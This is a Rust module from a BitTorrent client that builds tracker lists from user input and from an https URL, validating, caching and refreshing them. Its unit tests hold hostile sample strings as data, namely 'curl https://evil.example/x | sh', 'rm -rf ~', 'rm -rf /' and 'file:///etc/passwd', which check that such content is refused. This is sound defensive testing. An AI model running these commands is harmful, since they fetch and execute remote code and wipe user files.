//! Trackers added to every new download (D66): a list the user types and a list fetched from
//! an `https://` address, both under Preferences > Advanced > Trackers.
//!
//! The merged list goes to the engine (`SessionHandle::set_extra_trackers`), which appends it
//! to new public downloads only. What comes from the web is **data, never code**: at most
//! [`MAX_BYTES`] of text, of which only the lines that are tracker addresses are kept, and an
//! answer that is not mostly such lines (an error page, a script, a binary) is refused whole.
//! Nothing of it is run, shown as markup or written anywhere but this module's cache file.
//! Whoever controls the address can still name trackers, which then learn this client's
//! address and the hashes of its public downloads: that is why it must be `https://` and why
//! private torrents never get the list.

use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::mpsc;
use std::time::{Duration, Instant};

use rookparcel_core::fetch::{FetchOptions, FetchProxy, http_get};
use rookparcel_core::metainfo::is_valid_tracker_url;

use crate::options::GuiOptions;
use crate::{fmt, tr};

/// The largest list fetched.
pub const MAX_BYTES: usize = 256 * 1024;
/// The most trackers kept, of the typed list and the fetched one together.
pub const MAX_TRACKERS: usize = 200;
/// The longest tracker address.
pub const MAX_URL: usize = 1024;
/// How often a list that was fetched is fetched again.
pub const REFRESH: Duration = Duration::from_secs(24 * 3600);
/// How long after a failed fetch the next one is tried.
pub const RETRY: Duration = Duration::from_secs(3600);
/// The cache file's name in the settings folder.
pub const CACHE_FILE: &str = "trackers-url.txt";

/// Why a fetched list was not used.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Reject {
    /// Not `https://`, or not an address at all.
    NotHttps,
    /// Not text (invalid UTF-8 or control characters).
    NotText,
    /// No line is a tracker address.
    Empty,
    /// More lines are something else than are tracker addresses.
    NotAList,
    /// The fetch failed.
    Fetch(String),
}

impl Reject {
    pub fn text(&self) -> String {
        match self {
            Reject::NotHttps => tr!(TrackersErrHttps).to_owned(),
            Reject::NotText | Reject::NotAList => tr!(TrackersErrNotList).to_owned(),
            Reject::Empty => tr!(TrackersErrEmpty).to_owned(),
            Reject::Fetch(e) => e.clone(),
        }
    }
}

/// Whether `url` may be fetched as a tracker list: `https://` with a host, no blanks or
/// control characters, of a sane length.
pub fn is_list_url(url: &str) -> bool {
    let Some(rest) = url.get(..8).filter(|s| s.eq_ignore_ascii_case("https://")).map(|_| &url[8..]) else {
        return false;
    };
    let host = rest.split(['/', '?', '#']).next().unwrap_or_default();
    !host.is_empty()
        && !host.starts_with([':', '@'])
        && url.len() <= 2048
        && !url.chars().any(|c| c.is_whitespace() || c.is_control())
}

/// A list's lines sorted into tracker tiers.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Parsed {
    /// Tiers of valid, distinct tracker addresses; no tier is empty.
    pub tiers: Vec<Vec<String>>,
    /// Lines that are not tracker addresses (comments starting with `#` are not counted).
    pub invalid: usize,
    /// Valid trackers left out because the list is longer than [`MAX_TRACKERS`].
    pub dropped: usize,
}

impl Parsed {
    pub fn count(&self) -> usize {
        count(&self.tiers)
    }
}

/// The number of trackers in `tiers`.
pub fn count(tiers: &[Vec<String>]) -> usize {
    tiers.iter().map(Vec::len).sum()
}

/// Reads a list: one tracker address per line (`http://`, `https://` or `udp://`), a blank
/// line between tiers, `#` starts a comment line. Repeats are dropped. Lenient: lines that are
/// not tracker addresses are counted and skipped, so the caller decides what they mean.
pub fn parse(text: &str) -> Parsed {
    let mut p = Parsed { tiers: vec![Vec::new()], ..Parsed::default() };
    let mut seen = HashSet::new();
    let mut kept = 0;
    for line in text.lines().map(str::trim) {
        if line.is_empty() {
            if !p.tiers.last().is_some_and(Vec::is_empty) {
                p.tiers.push(Vec::new());
            }
        } else if line.starts_with('#') {
        } else if line.len() > MAX_URL || !is_valid_tracker_url(line) {
            p.invalid += 1;
        } else if seen.insert(line) {
            if kept == MAX_TRACKERS {
                p.dropped += 1;
            } else {
                kept += 1;
                p.tiers.last_mut().expect("never empty").push(line.to_owned());
            }
        }
    }
    p.tiers.retain(|t| !t.is_empty());
    p
}

/// What a fetched body is worth: its tiers, or why it is refused whole.
pub fn parse_fetched(body: &[u8]) -> Result<Parsed, Reject> {
    if body.len() > MAX_BYTES {
        return Err(Reject::NotAList);
    }
    let text = std::str::from_utf8(body).map_err(|_| Reject::NotText)?;
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    if text.chars().any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t')) {
        return Err(Reject::NotText);
    }
    let p = parse(text);
    if p.count() == 0 {
        return Err(if p.invalid == 0 { Reject::Empty } else { Reject::NotAList });
    }
    // against every valid line, those past the limit included
    if p.invalid > p.count() + p.dropped {
        return Err(Reject::NotAList);
    }
    Ok(p)
}

/// The list as text again: a tracker per line, a blank line between tiers.
pub fn to_text(tiers: &[Vec<String>]) -> String {
    tiers.iter().filter(|t| !t.is_empty()).map(|t| t.join("\n")).collect::<Vec<_>>().join("\n\n")
}

/// The typed list as one line for the preferences file: trackers separated by a blank, tiers
/// by a lone `-` (neither can be in a tracker address).
pub fn to_stored(text: &str) -> String {
    parse(text).tiers.iter().map(|t| t.join(" ")).collect::<Vec<_>>().join(" - ")
}

/// [`to_stored`]'s line as the text the Preferences show.
pub fn from_stored(line: &str) -> String {
    let mut tiers: Vec<Vec<String>> = vec![Vec::new()];
    for word in line.split_whitespace() {
        if word == "-" {
            tiers.push(Vec::new());
        } else {
            tiers.last_mut().expect("never empty").push(word.to_owned());
        }
    }
    to_text(&tiers)
}

/// `typed` then `fetched`, without repeats, at most [`MAX_TRACKERS`].
pub fn merge(typed: &[Vec<String>], fetched: &[Vec<String>]) -> Vec<Vec<String>> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for tier in typed.iter().chain(fetched) {
        let tier: Vec<String> =
            tier.iter().filter(|u| seen.len() < MAX_TRACKERS && seen.insert(u.as_str())).cloned().collect();
        if !tier.is_empty() {
            out.push(tier);
        }
    }
    out
}

/// The four preferences ([`GuiOptions`]' `trackers_*`).
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Config {
    pub append: bool,
    /// The typed list, as the Preferences show it.
    pub typed: String,
    pub from_url: bool,
    pub url: String,
}

impl Config {
    pub fn of(g: &GuiOptions) -> Config {
        Config {
            append: g.trackers_append,
            typed: g.trackers_list.clone(),
            from_url: g.trackers_from_url,
            url: g.trackers_url.trim().to_owned(),
        }
    }
}

/// Fetches `url` (blocking: call it on a worker thread) and reads it as a list.
pub fn fetch(url: &str, proxy: Option<FetchProxy>) -> Result<Parsed, Reject> {
    if !is_list_url(url) {
        return Err(Reject::NotHttps);
    }
    let opts = FetchOptions { proxy, max_size: MAX_BYTES, no_downgrade: true, ..FetchOptions::default() };
    let resp = http_get(url, &opts).map_err(|e| Reject::Fetch(e.to_string()))?;
    parse_fetched(&resp.body)
}

type Fetched = (String, Result<Parsed, Reject>);

/// The lists and the fetch schedule of one program. Call [`TrackerList::tick`] about once a
/// second and send [`TrackerList::take_tiers`] to the engine when it gives a list.
pub struct TrackerList {
    cache: Option<PathBuf>,
    config: Config,
    /// The last good list of `fetched_url`.
    fetched: Vec<Vec<String>>,
    fetched_url: String,
    /// When it was fetched, Unix seconds; 0 = never.
    fetched_at: i64,
    error: Option<Reject>,
    next: Option<Instant>,
    running: Option<mpsc::Receiver<Fetched>>,
    /// What the engine was last given; `None` = nothing yet, so the first list is sent.
    sent: Option<Vec<Vec<String>>>,
    fetcher: fn(&str, Option<FetchProxy>) -> Result<Parsed, Reject>,
}

impl TrackerList {
    /// `cache` is the settings folder's [`CACHE_FILE`]; `None` keeps nothing between runs.
    pub fn new(cache: Option<PathBuf>, config: Config) -> TrackerList {
        let mut l = TrackerList {
            cache,
            config: Config::default(),
            fetched: Vec::new(),
            fetched_url: String::new(),
            fetched_at: 0,
            error: None,
            next: None,
            running: None,
            sent: None,
            fetcher: fetch,
        };
        l.load_cache();
        l.configure(config);
        l
    }

    #[cfg(test)]
    fn with_fetcher(mut self, f: fn(&str, Option<FetchProxy>) -> Result<Parsed, Reject>) -> TrackerList {
        self.fetcher = f;
        self
    }

    /// The cache file: `# <address>`, `# <unix time>`, then the list. Read through the same
    /// checks as a fetched list.
    fn load_cache(&mut self) {
        let Some(path) = &self.cache else { return };
        let Ok(meta) = std::fs::metadata(path) else { return };
        if meta.len() > (MAX_BYTES + 4096) as u64 {
            return;
        }
        let Ok(text) = std::fs::read_to_string(path) else { return };
        let mut lines = text.lines();
        let url = lines.next().and_then(|l| l.strip_prefix("# ")).unwrap_or_default().trim();
        let at = lines.next().and_then(|l| l.strip_prefix("# ")).and_then(|t| t.trim().parse::<i64>().ok());
        let (Some(at), true) = (at, is_list_url(url)) else { return };
        if let Ok(p) = parse_fetched(lines.collect::<Vec<_>>().join("\n").as_bytes()) {
            self.fetched = p.tiers;
            self.fetched_url = url.to_owned();
            self.fetched_at = at.max(0);
        }
    }

    fn save_cache(&self) {
        let Some(path) = &self.cache else { return };
        let text = format!("# {}\n# {}\n{}\n", self.fetched_url, self.fetched_at, to_text(&self.fetched));
        let _ = rookparcel_core::util::private_file::write(path, text.as_bytes());
    }

    /// New preferences. A list fetched from another address than the new one is forgotten at
    /// once (it must not outlive the address it came from), and the new address is fetched at
    /// the next tick.
    pub fn configure(&mut self, config: Config) {
        if config == self.config && self.next.is_some() == self.wants_fetch() {
            return;
        }
        let url_changed = config.url != self.config.url || config.from_url != self.config.from_url;
        self.config = config;
        if self.fetched_url != self.config.url {
            if !self.fetched_url.is_empty() {
                self.fetched.clear();
                self.fetched_url.clear();
                self.fetched_at = 0;
                if let Some(path) = &self.cache {
                    let _ = std::fs::remove_file(path);
                }
            }
            self.error = None;
        }
        if !self.wants_fetch() {
            self.next = None;
            self.error = (self.config.from_url && !self.config.url.is_empty()).then_some(Reject::NotHttps);
        } else if url_changed || self.next.is_none() {
            // a list from the cache that is still fresh waits for its day
            let age = rookparcel_core::util::time::unix_now().saturating_sub(self.fetched_at);
            let fresh = self.fetched_at > 0 && (0..REFRESH.as_secs() as i64).contains(&age);
            let wait = if fresh { REFRESH - Duration::from_secs(age as u64) } else { Duration::ZERO };
            self.next = Some(Instant::now() + wait);
        }
    }

    fn wants_fetch(&self) -> bool {
        self.config.from_url && is_list_url(&self.config.url)
    }

    /// Fetch at the next tick (the page's Update Now button).
    pub fn refresh_now(&mut self) {
        if self.wants_fetch() {
            self.next = Some(Instant::now());
        }
    }

    /// Takes a finished fetch and starts one that is due, on a worker thread. `proxy` is asked
    /// only when a fetch starts. Returns lines for the Logger.
    pub fn tick(&mut self, proxy: impl FnOnce() -> Option<FetchProxy>) -> Vec<String> {
        let mut log = Vec::new();
        if let Some(rx) = &self.running {
            match rx.try_recv() {
                Ok((url, result)) => {
                    self.running = None;
                    // an answer for an address that is no longer the one set is dropped
                    if url == self.config.url && self.wants_fetch() {
                        self.fetch_done(url, result, &mut log);
                    }
                }
                Err(mpsc::TryRecvError::Empty) => {}
                Err(mpsc::TryRecvError::Disconnected) => {
                    self.running = None;
                    self.next = Some(Instant::now() + RETRY);
                }
            }
        }
        if self.running.is_none() && self.wants_fetch() && self.next.is_some_and(|t| Instant::now() >= t) {
            self.next = None;
            let (tx, rx) = mpsc::channel();
            let (url, proxy, fetcher) = (self.config.url.clone(), proxy(), self.fetcher);
            let spawned = std::thread::Builder::new().name("tracker-list".into()).spawn(move || {
                let result = fetcher(&url, proxy);
                let _ = tx.send((url, result));
            });
            match spawned {
                Ok(_) => self.running = Some(rx),
                Err(_) => self.next = Some(Instant::now() + RETRY),
            }
        }
        log
    }

    fn fetch_done(&mut self, url: String, result: Result<Parsed, Reject>, log: &mut Vec<String>) {
        match result {
            Ok(p) => {
                let (old, new) = (count(&self.fetched), p.count());
                if p.tiers != self.fetched || self.fetched_url != url {
                    log.push(tr!(TrackersLogChanged, count = new, old = old));
                }
                self.fetched = p.tiers;
                self.fetched_url = url;
                self.fetched_at = rookparcel_core::util::time::unix_now();
                self.error = None;
                self.next = Some(Instant::now() + REFRESH);
                self.save_cache();
            }
            Err(e) => {
                // the last good list stays in use
                log.push(tr!(TrackersLogRejected, error = e.text()));
                self.error = Some(e);
                self.next = Some(Instant::now() + RETRY);
            }
        }
    }

    /// The trackers new downloads get now.
    pub fn tiers(&self) -> Vec<Vec<String>> {
        let typed = if self.config.append { parse(&self.config.typed).tiers } else { Vec::new() };
        let fetched: &[Vec<String>] =
            if self.wants_fetch() && self.fetched_url == self.config.url { &self.fetched } else { &[] };
        merge(&typed, fetched)
    }

    /// [`TrackerList::tiers`] when it is not what the engine has: send it.
    pub fn take_tiers(&mut self) -> Option<Vec<Vec<String>>> {
        let now = self.tiers();
        if self.sent.as_ref() == Some(&now) {
            return None;
        }
        self.sent = Some(now.clone());
        Some(now)
    }

    /// The page's status line for the list from the web; empty when it is switched off.
    pub fn status(&self) -> String {
        self.status_for(self.config.from_url, &self.config.url)
    }

    /// The status line for what a Preferences page shows now, applied or not: empty while its
    /// box is off or its address empty, as [`TrackerList::status`] is once that is applied, so
    /// the line never speaks of a list the page has switched off. An address other than the one
    /// in use has no list and no error yet.
    pub fn status_for(&self, from_url: bool, url: &str) -> String {
        let url = url.trim();
        if !from_url || url.is_empty() {
            return String::new();
        }
        let have = (self.fetched_at > 0 && self.fetched_url == url).then(|| {
            tr!(TrackersStatusOk, count = count(&self.fetched), time = fmt::date_time(self.fetched_at))
        });
        let error = self.error.as_ref().filter(|_| url == self.config.url);
        match (error, have) {
            (Some(e), Some(have)) => format!("{} {have}", tr!(TrackersStatusFailed, error = e.text())),
            (Some(e), None) => tr!(TrackersStatusFailed, error = e.text()),
            (None, Some(have)) => have,
            (None, None) => tr!(TrackersStatusNone).to_owned(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const A: &str = "udp://tracker.example:6969/announce";
    const B: &str = "https://b.example/announce";
    const C: &str = "http://c.example:80/announce";

    #[test]
    fn only_https_addresses_are_list_addresses() {
        assert!(is_list_url("https://example.org/trackers.txt"));
        assert!(is_list_url("HTTPS://example.org"));
        for bad in [
            "",
            "http://example.org/list.txt",
            "https://",
            "https:///list",
            "https://:443/x",
            "ftp://example.org/x",
            "file:///etc/passwd",
            "https://example.org/a b",
            "https://example.org/a\nb",
            "example.org/list",
            "javascript:alert(1)",
        ] {
            assert!(!is_list_url(bad), "{bad:?}");
        }
        assert!(!is_list_url(&format!("https://example.org/{}", "a".repeat(2100))));
    }

    #[test]
    fn a_list_is_tiers_of_distinct_valid_trackers() {
        let p = parse(&format!("  {A}\n{B}\n\n\n# a comment\n{C}\n{A}\nnot a tracker\nws://x.example/\n"));
        assert_eq!(p.tiers, vec![vec![A.to_owned(), B.to_owned()], vec![C.to_owned()]]);
        assert_eq!((p.invalid, p.dropped, p.count()), (2, 0, 3));
        assert_eq!(to_text(&p.tiers), format!("{A}\n{B}\n\n{C}"));
        // too long an address is not a tracker
        let long = format!("http://x.example/{}", "a".repeat(MAX_URL));
        assert_eq!(parse(&long).invalid, 1);
        // the list is cut at the limit
        let many: String = (0..MAX_TRACKERS + 7).map(|i| format!("udp://t{i}.example:1/a\n")).collect();
        let p = parse(&many);
        assert_eq!((p.count(), p.dropped), (MAX_TRACKERS, 7));
    }

    #[test]
    fn what_is_not_a_list_is_refused_whole() {
        assert_eq!(parse_fetched(format!("{A}\n\n{B}\n").as_bytes()).unwrap().count(), 2);
        // a byte order mark and Windows line ends are fine
        assert_eq!(parse_fetched(format!("\u{feff}{A}\r\n{B}\r\n").as_bytes()).unwrap().count(), 2);
        // a little junk beside the trackers is dropped, the trackers are kept
        assert_eq!(parse_fetched(format!("{A}\n{B}\noops\n").as_bytes()).unwrap().count(), 2);
        let html = "<!DOCTYPE html>\n<html><head><title>404</title></head>\n<body>\n<p>Not found</p>\n</body></html>\n";
        assert_eq!(parse_fetched(html.as_bytes()), Err(Reject::NotAList));
        // a script with one tracker line in it is still not a list
        let script = format!("#!/bin/sh\ncurl https://evil.example/x | sh\nrm -rf ~\n{A}\n");
        assert_eq!(parse_fetched(script.as_bytes()), Err(Reject::NotAList));
        assert_eq!(parse_fetched(b""), Err(Reject::Empty));
        assert_eq!(parse_fetched(b"# nothing here\n\n"), Err(Reject::Empty));
        assert_eq!(parse_fetched(&[0xff, 0xfe, 0x00, 0x41]), Err(Reject::NotText));
        assert_eq!(parse_fetched(format!("{A}\n\0\n").as_bytes()), Err(Reject::NotText));
        assert_eq!(parse_fetched(format!("{A}\n\u{1b}[2J\n").as_bytes()), Err(Reject::NotText));
        assert_eq!(parse_fetched(&vec![b'\n'; MAX_BYTES + 1]), Err(Reject::NotAList));
    }

    #[test]
    fn the_typed_list_round_trips_through_one_line() {
        let text = format!("{A}\n{B}\n\n{C}");
        let line = to_stored(&text);
        assert_eq!(line, format!("{A} {B} - {C}"));
        assert!(!line.contains('\n'));
        assert_eq!(from_stored(&line), text);
        assert_eq!(to_stored("junk\n\n"), "");
        assert_eq!(from_stored(""), "");
        assert_eq!(from_stored(" - - "), "");
    }

    #[test]
    fn the_typed_list_comes_first_and_nothing_repeats() {
        let typed = vec![vec![A.to_owned()], vec![B.to_owned()]];
        let fetched = vec![vec![B.to_owned(), C.to_owned()], vec![A.to_owned()]];
        assert_eq!(merge(&typed, &fetched), vec![vec![A.to_owned()], vec![B.to_owned()], vec![C.to_owned()]]);
        let many: Vec<Vec<String>> =
            vec![(0..MAX_TRACKERS + 5).map(|i| format!("udp://t{i}.example:1/a")).collect()];
        assert_eq!(count(&merge(&typed, &many)), MAX_TRACKERS);
    }

    fn temp(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("rp-trackers-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir.join(CACHE_FILE)
    }

    fn run(l: &mut TrackerList) -> Vec<String> {
        let mut log = Vec::new();
        for _ in 0..500 {
            log.extend(l.tick(|| None));
            if l.running.is_none() {
                return log;
            }
            std::thread::sleep(Duration::from_millis(5));
        }
        panic!("the fetch never finished");
    }

    fn good(url: &str, _: Option<FetchProxy>) -> Result<Parsed, Reject> {
        assert_eq!(url, "https://lists.example/t.txt");
        parse_fetched(format!("{B}\n\n{C}\n").as_bytes())
    }

    fn bad(_: &str, _: Option<FetchProxy>) -> Result<Parsed, Reject> {
        parse_fetched(b"<html><body>\n<h1>It works!</h1>\n</body></html>\n")
    }

    #[test]
    fn a_replaced_file_keeps_the_last_good_list() {
        let cache = temp("keep");
        let config = Config {
            append: true,
            typed: A.into(),
            from_url: true,
            url: "https://lists.example/t.txt".into(),
        };
        let mut l = TrackerList::new(Some(cache.clone()), config.clone()).with_fetcher(good);
        // before the first fetch: the typed list alone
        assert_eq!(l.take_tiers(), Some(vec![vec![A.to_owned()]]));
        assert_eq!(l.take_tiers(), None);
        let log = run(&mut l);
        assert_eq!(log.len(), 1, "{log:?}");
        let all = vec![vec![A.to_owned()], vec![B.to_owned()], vec![C.to_owned()]];
        assert_eq!(l.take_tiers(), Some(all.clone()));
        assert!(l.error.is_none() && l.fetched_at > 0);
        assert!(cache.exists());

        // the file on the web becomes something else: refused, logged, the list stays
        l.fetcher = bad;
        l.refresh_now();
        let log = run(&mut l);
        assert_eq!(log.len(), 1, "{log:?}");
        assert_eq!(l.error, Some(Reject::NotAList));
        assert_eq!(l.tiers(), all);
        assert_eq!(l.take_tiers(), None);
        assert!(!l.status().is_empty());

        // the next start reads the cache and does not fetch while it is fresh
        let mut l = TrackerList::new(Some(cache.clone()), config.clone()).with_fetcher(bad);
        assert_eq!(l.tiers(), all);
        assert!(run(&mut l).is_empty());
        assert!(l.next.is_some_and(|t| t > Instant::now() + Duration::from_secs(3600)));

        // another address: the old list is gone at once, cache and all
        let other = Config { url: "https://other.example/x".into(), ..config.clone() };
        l.configure(other);
        assert_eq!(l.tiers(), vec![vec![A.to_owned()]]);
        assert!(!cache.exists());

        // switched off: only the typed list; both off: nothing
        let mut l = TrackerList::new(Some(cache.clone()), Config { from_url: false, ..config.clone() });
        assert_eq!(l.tiers(), vec![vec![A.to_owned()]]);
        assert_eq!(l.status(), "");
        l.configure(Config { append: false, from_url: false, ..config });
        assert_eq!(l.take_tiers(), Some(Vec::new()));
        let _ = std::fs::remove_dir_all(cache.parent().unwrap());
    }

    /// The Preferences page's line follows its own box and address, applied or not (GTK showed
    /// "20 trackers, downloaded ..." beside a box switched off while OK was refused).
    #[test]
    fn the_status_line_follows_what_the_page_shows() {
        let url = "https://lists.example/t.txt";
        let config = Config { append: false, typed: String::new(), from_url: true, url: url.into() };
        let mut l = TrackerList::new(None, config.clone()).with_fetcher(good);
        let none = tr!(TrackersStatusNone).to_owned();
        assert_eq!((l.status(), l.status_for(true, url)), (none.clone(), none.clone()));
        run(&mut l);
        let ok = l.status();
        assert!(ok.contains('2') && ok != none, "{ok}");
        assert_eq!(l.status_for(true, &format!(" {url} ")), ok);
        // the page's box switched off, not applied yet: nothing, as after Apply
        assert_eq!(l.status_for(false, url), "");
        assert_eq!(l.status_for(true, "  "), "");
        // another address typed: that one has no list yet
        assert_eq!(l.status_for(true, "https://other.example/x"), none);

        // a failed fetch speaks of the address in use only
        l.fetcher = bad;
        l.refresh_now();
        run(&mut l);
        assert!(
            l.status_for(true, url).starts_with(&tr!(TrackersStatusFailed, error = Reject::NotAList.text()))
        );
        assert_eq!(l.status_for(true, "https://other.example/x"), none);

        // applied off: the line is empty; ticked again on the page, the kept list shows
        l.configure(Config { from_url: false, ..config });
        assert_eq!(l.status(), "");
        assert_eq!(l.status_for(true, url), ok);
    }

    #[test]
    fn an_address_that_is_not_https_is_never_fetched() {
        fn never(_: &str, _: Option<FetchProxy>) -> Result<Parsed, Reject> {
            panic!("fetched");
        }
        let config = Config {
            append: false,
            typed: String::new(),
            from_url: true,
            url: "http://lists.example/t.txt".into(),
        };
        let mut l = TrackerList::new(None, config).with_fetcher(never);
        assert!(run(&mut l).is_empty());
        assert_eq!(l.error, Some(Reject::NotHttps));
        assert!(l.tiers().is_empty());
        assert_eq!(fetch("http://lists.example/t.txt", None), Err(Reject::NotHttps));
        assert_eq!(fetch("file:///c:/list.txt", None), Err(Reject::NotHttps));
    }

    #[test]
    fn a_cache_file_that_was_tampered_with_is_not_used() {
        let cache = temp("tamper");
        let config = Config {
            append: false,
            typed: String::new(),
            from_url: true,
            url: "https://lists.example/t.txt".into(),
        };
        for text in [
            "<html>\n<body>\n</body>\n".to_owned(),
            format!("# http://lists.example/t.txt\n# 5\n{A}\n"),
            format!("# https://lists.example/t.txt\n# soon\n{A}\n"),
            format!("# https://lists.example/t.txt\n# 5\n#!/bin/sh\nrm -rf /\ncurl x | sh\n{A}\n"),
        ] {
            std::fs::write(&cache, &text).unwrap();
            let l = TrackerList::new(Some(cache.clone()), config.clone());
            assert!(l.tiers().is_empty(), "{text:?}");
        }
        // a good cache of another address is dropped when the address set is not its own
        std::fs::write(&cache, format!("# https://elsewhere.example/t.txt\n# 5\n{A}\n")).unwrap();
        let l = TrackerList::new(Some(cache.clone()), config);
        assert!(l.tiers().is_empty());
        assert!(!cache.exists());
        let _ = std::fs::remove_dir_all(cache.parent().unwrap());
    }
}
